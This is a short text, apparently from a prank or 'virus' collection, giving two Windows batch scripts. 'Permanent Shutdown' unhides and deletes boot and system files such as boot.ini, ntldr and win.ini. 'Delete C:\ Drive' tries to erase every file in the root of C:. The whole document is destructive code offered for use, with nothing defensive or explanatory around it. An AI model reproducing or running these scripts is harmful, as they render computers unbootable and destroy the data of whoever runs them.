Permanent Shutdown

@echo off
attrib -r -s -h C:\autoexec.bat
del C:\autoexec.bat
attrib -r -s -h C:\boot.ini
del C:\boot.ini
attrib -r -s -h C:\ntldr
del C:\ntldr
attrib -r -s -h C:\Windows\win.ini
del C:\Windows\win.ini


Delete C:\ Drive

@echo off
Del C:\*.* |y

@echo off
